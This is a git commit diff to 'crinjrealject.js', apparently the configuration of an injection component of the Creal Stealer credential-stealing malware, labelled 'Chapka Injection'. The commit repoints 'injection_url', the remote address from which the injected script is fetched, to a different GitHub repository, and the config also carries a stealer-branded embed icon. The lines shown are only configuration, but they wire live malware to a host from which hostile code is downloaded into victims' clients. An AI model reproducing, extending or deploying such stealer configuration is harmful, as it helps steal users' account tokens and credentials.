5fa4c3268d00f3d402e57fed0fe343e975b2f15a
nxbi284 <157406837+nxbi284@users.noreply.github.com>
2024-01-22 18:53:58 +0100

    Update crinjrealject.js

--- crinjrealject.js
+++ crinjrealject.js
@@ -20,7 +20,7 @@ const config = {
   embed_name: 'Chapka Injection', 
   embed_icon: 'https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js', 
+  injection_url: 'https://raw.githubusercontent.com/nxbi284/crinjrealject/main/crinjrealject.js', 
   /**
    
    **/
